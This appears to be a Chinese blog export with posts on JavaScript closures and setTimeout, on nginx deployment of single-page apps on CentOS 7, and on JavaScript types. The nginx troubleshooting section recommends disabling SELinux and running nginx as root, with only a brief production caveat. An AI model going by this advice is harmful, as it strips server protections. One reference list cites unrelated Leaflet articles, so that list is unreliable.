<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>
    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>j <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> j<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> j<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">// 正确地按定时输出了“5， 4， 3， 2， 1， go！”</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="多重函数闭包"><a href="#多重函数闭包" class="headerlink" title="多重函数闭包"></a>多重函数闭包</h2><p>看过闭包那章就知道还可以用多重函数闭包来创建新的作用域。回调函数作为 setTimeout 方法的参数被传递，因此回调函数记住了自身声明时的 timeoutFunc 的作用域，即回调函数与 timeoutFunc 的作用域形成闭包。for 循环每次生成的变量 i 作为参数传递给 timeoutFunc 的作用域并通过闭包保存下来，使得回调函数在调用时能够访问到正确的 i。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">timeoutFunc</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">timeoutFunc</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>同样的道理，我们还可以在回调函数内部形成闭包，这有点类似于第一次不成功的 IIFE。callbackFunc 中的匿名函数通过 return 的方式与 callbackFunc 函数的作用域形成闭包，for 循环每次生成的 i 作为 callbackFunc 的参数被传递到 callbackfunc 中并通过闭包保存下来，使内部的匿名函数在被调用时依然能够访问到闭包中正确的 i。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token function">callbackFunc</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">function</span> <span class="token function">callbackFunc</span><span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="let-块作用域"><a href="#let-块作用域" class="headerlink" title="let 块作用域"></a>let 块作用域</h2><p>最后一种方式则是最简单的方式，就是利用 ES6 中的 let 关键字有块作用域的特点，使 for 循环每次生成的 i 都在相互隔绝的块作用域中，回调函数与块作用域形成闭包，回调函数在被调用时可以访问到相对应的块作用域中正确的变量 i。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h2 id="前方高能预警"><a href="#前方高能预警" class="headerlink" title="前方高能预警"></a>前方高能预警</h2><hr>
<p>其实将 for 循环每次产生的 i 做为参数传递给 setTimeout 的回调函数就能解决这个问题。回调函数的参数 i 会屏蔽全局变量 i，使回调函数内的 i 正确绑定 for 循环每次生成的 i。setTimeout 从第三个参数开始的参数就是可以传递给回调函数的参数。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
  <span class="token function">setTimeout</span><span class="token punctuation">(</span>
    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">i</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>i <span class="token operator">===</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token string">'go!'</span> <span class="token operator">:</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1000</span><span class="token punctuation">,</span>
    i
  <span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>参考链接<br>[<a href="https://www.jianshu.com/p/867cbe73d534]">https://www.jianshu.com/p/867cbe73d534]</a><br>[<a href="https://segmentfault.com/a/1190000007396482#articleHeader2]">https://segmentfault.com/a/1190000007396482#articleHeader2]</a><br>[<a href="http://www.ruanyifeng.com/blog/2014/10/event-loop.html]">http://www.ruanyifeng.com/blog/2014/10/event-loop.html]</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>闭包</tag>
        <tag>IIFE</tag>
        <tag>单线程运行机制</tag>
      </tags>
  </entry>
  <entry>
    <title>linux系统nginx部署前端项目</title>
    <url>/2019/07/05/linux%E7%B3%BB%E7%BB%9Fnginx%E9%83%A8%E7%BD%B2%E5%89%8D%E7%AB%AF%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>系统环境 centos7，本文中默认使用 root 用户，故没有 sudo 命令，实践中根据用户不同酌情添加。</p>
<h2 id="安装-nginx-服务器"><a href="#安装-nginx-服务器" class="headerlink" title="安装 nginx 服务器"></a>安装 nginx 服务器</h2><h3 id="1-在-yum-中安装-nginx-源"><a href="#1-在-yum-中安装-nginx-源" class="headerlink" title="1. 在 yum 中安装 nginx 源"></a>1. 在 yum 中安装 nginx 源</h3><p>安装前置环境</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> yum-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>新建文件/etc/yum.repo.d/nginx.repo，内容为</p>
<pre class="line-numbers language-conf" data-language="conf"><code class="language-conf">[nginx-stable]
name&#x3D;nginx stable repo
baseurl&#x3D;http:&#x2F;&#x2F;nginx.org&#x2F;packages&#x2F;centos&#x2F;$releasever&#x2F;$basearch&#x2F;
gpgcheck&#x3D;1
enabled&#x3D;1
gpgkey&#x3D;https:&#x2F;&#x2F;nginx.org&#x2F;keys&#x2F;nginx_signing.key

[nginx-mainline]
name&#x3D;nginx mainline repo
baseurl&#x3D;http:&#x2F;&#x2F;nginx.org&#x2F;packages&#x2F;mainline&#x2F;centos&#x2F;$releasever&#x2F;$basearch&#x2F;
gpgcheck&#x3D;1
enabled&#x3D;0
gpgkey&#x3D;https:&#x2F;&#x2F;nginx.org&#x2F;keys&#x2F;nginx_signing.key<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>默认使用 nginx-stable 的源，若要使用 nginx-mainline 的源，将 enabled 更改为 1。或直接使用以下命令</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum-config-manager --enable nginx-mainline<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<span id="more"></span>

<h3 id="2-安装-nginx"><a href="#2-安装-nginx" class="headerlink" title="2. 安装 nginx"></a>2. 安装 nginx</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">yum <span class="token function">install</span> nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="启动-nginx-服务"><a href="#启动-nginx-服务" class="headerlink" title="启动 nginx 服务"></a>启动 nginx 服务</h2><p>常规起动 nginx 服务器的方法是使用 nginx 命令，在 CentOS7 系统中，nginx 安装程序已经自动为我们注册了一个 nginx 服务，可以直接使用 systemctl 命令启动 nginx，nginx 默认的配置文件监听了 80 端口，直接启动 nginx 服务就可以访问到 nginx 的示例页面。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">systemctl start nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="1-防火墙端口放行"><a href="#1-防火墙端口放行" class="headerlink" title="1. 防火墙端口放行"></a>1. 防火墙端口放行</h3><p>我们这时候通过服务器的 ip 地址去访问服务器其实是访问不到的，因为服务器的防火墙没有放行我们要访问的端口。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># --permanent 使设置永久生效</span>
<span class="token comment"># --zone=public 指定了配置规则生效的域为public，防火墙预设了多个域，一般默认为public域</span>
<span class="token comment"># --add-port=80/tcp 放行了80端口，协议为tcp协议（http协议的底层就是tcp协议）</span>
firewall-cmd --permanent --zone<span class="token operator">=</span>public --add-port<span class="token operator">=</span><span class="token number">80</span>/tcp
<span class="token comment"># 修改完防火墙后，要重启防火墙服务，服务名为firewalld</span>
systemctl restart firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这时候我们访问服务器的 ip 地址，发现已经可以访问到 nginx 的示例页面了。</p>
<h3 id="2-403-Forbidden"><a href="#2-403-Forbidden" class="headerlink" title="2. 403 Forbidden"></a>2. 403 Forbidden</h3><p>当示例页面可以访问了以后，我们就可以把自己做的页面放在 nginx 服务器上了，使用 sftp 将文件夹传到服务器上。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># sftp 常用命令</span>
<span class="token comment"># 改变远程工作目录</span>
<span class="token builtin class-name">cd</span>
<span class="token comment"># 改变本地工作目录</span>
lcd
<span class="token comment"># 查看远程工作目录</span>
<span class="token builtin class-name">pwd</span>
<span class="token comment"># 查看本地工作目录</span>
lpwd
<span class="token comment"># 列出远程目录</span>
<span class="token function">ls</span>
<span class="token comment"># 列出本地目录</span>
lls
<span class="token comment"># 上传文件，-r表示递归文件夹</span>
put -r 本地目录
<span class="token comment"># 下载文件，-r表示递归文件夹</span>
get -r 远程目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 将网站页面文件上传到/home/www文件夹</span>
<span class="token comment"># 新建并切换远程工作目录</span>
<span class="token builtin class-name">cd</span> /home
<span class="token function">mkdir</span> www
<span class="token builtin class-name">cd</span> www
<span class="token comment"># 切换本地工作目录到打包后的项目父级目录中（目录结构为./dist/demo）</span>
lcd dist
<span class="token comment"># 上传</span>
put -r demo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上传完成后，修改/etc/nginx/conf.d/default.conf 默认配置文件的路径</p>
<pre class="line-numbers language-conf" data-language="conf"><code class="language-conf"># 仅显示了要修改的配置，其他略去
server &#123;
  location &#x2F; &#123;
    root &#x2F;home&#x2F;www&#x2F;demo;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>修改配置后，重启 nginx 服务</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">systemctl restart nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>这时我们再去访问服务器，发现页面并没有如愿展示，而是显示了 403 Forbidden 错误页面。</p>
<p>出问题时查看错误日志永远是定位问题最快捷的解决方法，查看/var/log/nginx/error.log 文件，我们发现报错信息为 403 Forbidden ( 13: permission denied )，这意味着我们没有权限，此时应该从下面四个方向排查问题。</p>
<h4 id="1-检查-root-指向的目录下是否缺少-index-html-文件"><a href="#1-检查-root-指向的目录下是否缺少-index-html-文件" class="headerlink" title="(1) 检查 root 指向的目录下是否缺少 index.html 文件"></a>(1) 检查 root 指向的目录下是否缺少 index.html 文件</h4><p>当网站项目根目录下缺失了 index.html 时就会导致 403 错误，当然我们的 demo 文件夹下是有 index.html 的，排除了这一点。</p>
<h4 id="2-是否关闭了-SELinux"><a href="#2-是否关闭了-SELinux" class="headerlink" title="(2) 是否关闭了 SELinux"></a>(2) 是否关闭了 SELinux</h4><p>SELinux 是安全增强式的 linux，开启了 SELinux 常常会导致没有权限访问的情况，由于其配置麻烦，通常都是直接关闭的。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 查看SELinux状态</span>
getenforce <span class="token comment"># 得到值为enforcing，说明SELinux为开启状态</span>
<span class="token comment"># 临时修改SELinux状态为permissive，该状态下只记录不拦截，系统重启后恢复到enforcing状态</span>
setenforce <span class="token number">0</span>
getenforce <span class="token comment"># 得到值为permissive</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>若要永久修改 SELinux 状态，则修改/etc/selinux/config，SELINUX=enforcing 改为 permissive 或 disable。permissive 记录了违反了安全规则的行为，但并不会拦截，而 disable 则是彻底关闭。</p>
<h4 id="3-web-网站页面所在的文件夹是否拥有读权限与执行权限"><a href="#3-web-网站页面所在的文件夹是否拥有读权限与执行权限" class="headerlink" title="(3) web 网站页面所在的文件夹是否拥有读权限与执行权限"></a>(3) web 网站页面所在的文件夹是否拥有读权限与执行权限</h4><p>刚刚我们只是上传了 demo 文件夹，并没有更改权限，这也是导致 403 错误的一个原因。</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token comment"># 修改demo文件夹权限</span>
<span class="token function">chmod</span> <span class="token number">755</span> -R /home/www/demo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="4-nginx-conf-中用户与启动用户不一致"><a href="#4-nginx-conf-中用户与启动用户不一致" class="headerlink" title="(4) nginx.conf 中用户与启动用户不一致"></a>(4) nginx.conf 中用户与启动用户不一致</h4><p>查看 nginx 的启动用户</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">ps</span> aux <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"nginx: worker process"</span> <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print $1&#125;'</span>
<span class="token comment"># nginx</span>
<span class="token comment"># root</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>我们发现是 nginx 用户启动的，而我们现在使用的是 root 用户。这时就需要我们在/etc/nginx/nginx.conf 文件中将 user 由 nginx 改为 root。</p>
<p>注意，这里只是针对 403 错误的举例，通常生产环境使用时，不应该用 root 用户启动，会造成安全隐患，应该切换到 nginx 用户启动 nginx 服务。</p>
<h2 id="单页面应用的配置"><a href="#单页面应用的配置" class="headerlink" title="单页面应用的配置"></a>单页面应用的配置</h2><p>做到上面一步，我们已经能通过访问服务器，浏览原生网站了。然而事情并不是这么简单，现代前端开发，大量使用了单页面应用的框架，如 react、vue、angular 等，页面路由不再由后端控制，而是由前端来控制，那么服务器端就需要额外的配置来支持单页面应用的部署。</p>
<p>针对单页面应用配置的核心思想就是将所有对文件的查找都重定向到 index.html 由 index.html 中引用的 js 来处理所有路由匹配任务。</p>
<p>这里以 vue 举例，通常情况下，vue.config.js 中的 publicPath 配置为相对路径”./“适应性最强，但是一旦使用了 history 模式就不能使用相对路径了。所以我们只讨论绝对路径的两种情况，一种是在根路径”/“，一种是在子路径，如”/demo”。</p>
<h3 id="在根路径”-“下"><a href="#在根路径”-“下" class="headerlink" title="在根路径”/“下"></a>在根路径”/“下</h3><pre class="line-numbers language-conf" data-language="conf"><code class="language-conf">location &#x2F; &#123;
  root  &#x2F;home&#x2F;www&#x2F;demo;
  index index.html index.htm;
  try_files $uri $uri&#x2F; &#x2F;index.html;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="在子路径，如”-demo”下"><a href="#在子路径，如”-demo”下" class="headerlink" title="在子路径，如”/demo”下"></a>在子路径，如”/demo”下</h3><pre class="line-numbers language-conf" data-language="conf"><code class="language-conf"># 使用root指向网站目录
location &#x2F;demo &#123;
  root  &#x2F;home&#x2F;www;
  index index.html index.htm;
  try_files $uri $uri&#x2F; &#x2F;demo&#x2F;index.html;
&#125;
# 使用alias指向网站目录
location &#x2F;demo &#123;
  alias  &#x2F;home&#x2F;www&#x2F;demo;
  index index.html index.htm;
  try_files $uri $uri&#x2F; &#x2F;demo&#x2F;index.html;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="两个服务器，反向代理的方式"><a href="#两个服务器，反向代理的方式" class="headerlink" title="两个服务器，反向代理的方式"></a>两个服务器，反向代理的方式</h3><pre class="line-numbers language-conf" data-language="conf"><code class="language-conf"># 服务器A
server &#123;
  # 监听80端口
  listen 80;
  # nginx示例页面
  location &#x2F; &#123;
    root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;
    index index.html index.htm;
  &#125;
  # 反向代理
  location &#x2F;demo &#123;
    proxy_pass http:&#x2F;&#x2F;localhost:8080&#x2F;demo;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-conf" data-language="conf"><code class="language-conf"># 服务器B
server &#123;
  # 监听8080端口
  listen 8080;
  # nginx示例页面
  location &#x2F; &#123;
    root &#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html;
    index index.html index.htm;
  &#125;
  # 子目录
  location &#x2F;demo &#123;
    root &#x2F;home&#x2F;www;
    index index.html index.htm;
    try_files $uri $uri&#x2F; &#x2F;demo&#x2F;index.html;
  &#125;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>注意：</p>
<ol>
<li><p>try_files 会匹配所有书写的路径，若全部匹配失败，则会跳转到最后一个目标路径，所以最后一个路径一定要是能访问到的；</p>
</li>
<li><p>为了防止循环匹配，要在 vue 的路由中处理不存在的地址，因为 try_files 会使服务器处理不存在地址失效；</p>
</li>
<li><p>使用 root 匹配是将 url 中的 host 部分替换为 root 中设置的路径，例如访问<a href="http://localhost/demo/index.html%EF%BC%8C%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86/demo%EF%BC%8C%E5%B0%86demo%E5%89%8D%E7%9A%84http://localhost%E6%9B%BF%E6%8D%A2%E4%B8%BAroot%E4%B8%AD%E8%AE%BE%E7%BD%AE%E7%9A%84/home/www%EF%BC%8C%E5%B0%B1%E5%BE%97%E5%88%B0%E4%BA%86%E8%A6%81%E8%AE%BF%E9%97%AE%E7%9A%84%E7%A1%AC%E7%9B%98%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80/home/www/demo/index.html%EF%BC%9B">http://localhost/demo/index.html，匹配到了/demo，将demo前的http://localhost替换为root中设置的/home/www，就得到了要访问的硬盘真实地址/home/www/demo/index.html；</a></p>
</li>
<li><p>使用 alias 匹配是将匹配到的部分整个替换，例如访问<a href="http://localhost/demo/index.html%EF%BC%8C%E5%8C%B9%E9%85%8D%E5%88%B0demo%EF%BC%8C%E5%B0%86%E5%8C%85%E6%8B%ACdemo%E5%9C%A8%E5%86%85%E7%9A%84%E5%89%8D%E9%9D%A2%E7%9A%84%E6%89%80%E6%9C%89%E5%9C%B0%E5%9D%80http://localhost/demo%E9%83%BD%E6%9B%BF%E6%8D%A2%E4%B8%BAalias%E8%AE%BE%E7%BD%AE%E7%9A%84/home/www/demo%EF%BC%8C%E5%8D%B3%E5%BE%97%E5%88%B0%E4%BA%86%E7%A1%AC%E7%9B%98%E7%9C%9F%E5%AE%9E%E5%9C%B0%E5%9D%80/home/www/demo/index.html%EF%BC%9B">http://localhost/demo/index.html，匹配到demo，将包括demo在内的前面的所有地址http://localhost/demo都替换为alias设置的/home/www/demo，即得到了硬盘真实地址/home/www/demo/index.html；</a></p>
</li>
<li><p>nginx 配置文件在/etc/nginx/nginx.conf，nginx.conf 默认导入了/etc/nginx/conf.d 下的所有 conf 文件，因此只要在 conf.d 下新增后缀为 conf 的文件即可。每个文件都可以新增一个 server 块，监听不同的端口，不过要记得打开端口的防火墙。每次修改配置文件后都要重启 nginx 服务方可生效；</p>
</li>
<li><p>单页面应用应避免部署在根目录下再进行反向代理，因为通过当前服务器 A 请求被代理的 B 服务器上的 index.html 时能够正常访问到代理服务器 B，但是 B 中的 index.html 请求资源时又没有从代理服务器 B 请求，而是请求到了当前服务器 A，当前服务器 A 下是没有资源文件的，就会请求失败。而如果在 B 服务器上将网站部署在子目录下，如/demo，通过当前服务器 A 请求被代理的 B 服务器上的 index.html，则能正确访问资源。</p>
</li>
</ol>
<blockquote>
<p>参考链接<br><a href="https://www.centos.bz/2018/12/%E8%A7%A3%E5%86%B3nginx%E5%87%BA%E7%8E%B0403-forbidden-13-permission-denied%E6%8A%A5%E9%94%99%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E6%B3%95">解决 Nginx 出现 403 forbidden (13:Permission denied)报错的四种方法</a><br><a href="https://www.jianshu.com/p/05f889faa74b">Vue 爬坑之路三：Nginx 部署</a><br><a href="https://www.jianshu.com/p/4be0d5882ec5">Nginx 静态服务配置——详解 root 和 alias 指令</a><br><a href="https://www.jianshu.com/p/5825b18c80a1">centos7 防火墙配置整理</a><br><a href="https://blog.51cto.com/10546390/1754757">Nginx 的 try_files 参数保证能懂的讲解</a></p>
</blockquote>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript面向对象精要</title>
    <url>/2021/02/20/javascript%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%B2%BE%E8%A6%81/</url>
    <content><![CDATA[<h2 id="原始类型与引用类型"><a href="#原始类型与引用类型" class="headerlink" title="原始类型与引用类型"></a>原始类型与引用类型</h2><p>JavaScript 虽然没有类的概念（ES6 后增加了 class 语法糖，但本质上还是通过原型实现的），但依然存在两种类型：原始类型和引用类型。</p>
<ul>
<li>原始类型保存为简单数据值；</li>
<li>引用类型则保存为对象，其本质是指向内存位置的引用；</li>
</ul>
<p>为了让开发者能够把原始类型和引用类型按相同方式处理，JavaScript 花费了很大努力来保证语言的一致性。</p>
<p>其他编程语言用栈储存原始类型，用堆储存引用类型。JavaScript 则完全不同：它使用一个变量对象追踪变量的生命周期，原始类型的值被直接保存在变量对象内，而引用类型的值则作为一个指针保存在变量对象内，该指针指向实际对象在内存中的存储位置。</p>
<h3 id="原始类型"><a href="#原始类型" class="headerlink" title="原始类型"></a>原始类型</h3><p>JavaScript 共有 5 种原始类型：boolean number string null undefined。所有原始类型的值都有字面形式。原始类型的变量直接保存原始值。</p>
<p>鉴别原始类型的最佳方法是使用 typeof 操作符。它可以被用在任何变量上，并返回一个说明数据类型的字符串。</p>
<p>需要注意的是当运行 typeof null 时，结果是’object’，其实这已经被设计和维护 JavaScript 的委员会 TC39 认定是一个错误，但出于向前兼容的需要，并未修改。在逻辑上可以认为 null 是一个空的对象指针，所以结果为’object’。判断一个值是否为空类型的<strong>最佳</strong>方法是直接和 null 比较<code>value === null</code>。</p>
<blockquote>
<p>非强制转换比较<br>=== 在进行比较时不会将变量强制转换为另一种类型，所以比较 undefined 和 null 时，== 认为它们相等，而 === 认为它们不相等。</p>
</blockquote>
<p>虽然字符串、数字、布尔是原始类型，并不是对象，但它们也拥有方法（null 和 undefined 没有方法）。JavaScript 使它们看上去像对象一样，以此来提供语言上的一致性体验。</p>
<h3 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h3><p>引用类型主要指 JavaScript 中的对象，同时也是该语言中最接近类的东西。我们既可以使用 new 操作符和构造函数的方式来创建对象，也可以使用字面量的形式创建对象。任何函数都可以是构造函数，根据命名规范，JavaScript 中的构造函数用首字母大写跟非构造函数进行区分。</p>
<p>引用类型不在变量中直接保存对象实例，而是一个指向内存中实际对象所在位置的指针（或者说引用）。当一个对象赋值给变量时，实际是赋值给这个变量一个指针。这意味着将一个变量赋值给另一个变量时，两个变量各获得了一份指针的拷贝，指向内存中的同一个对象。</p>
<blockquote>
<p>参考资料</p>
<p><a href="https://www.jianshu.com/p/85df27410fb8/">leaflet 加载 arcgis 切片</a></p>
<p><a href="https://blog.csdn.net/weixin_40184249/article/details/83933048">LeaFlet 中切片图层使用自定义坐标系</a></p>
<p><a href="https://blog.csdn.net/u010303603/article/details/81741630">leaflet 系列二 加载 arcgis 自定义坐标系服务</a></p>
<p><a href="https://blog.csdn.net/yisimo/article/details/109388789">在 Leaflet 中自定义 4490 坐标系</a></p>
<p><a href="https://en.wikipedia.org/wiki/EPSG_Geodetic_Parameter_Dataset">EPSG Geodetic Parameter Dataset</a></p>
</blockquote>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
      <tags>
        <tag>面向对象</tag>
      </tags>
  </entry>
  <entry>
    <title>javascript闭包</title>
    <url>/2018/03/23/javascript%E9%97%AD%E5%8C%85/</url>
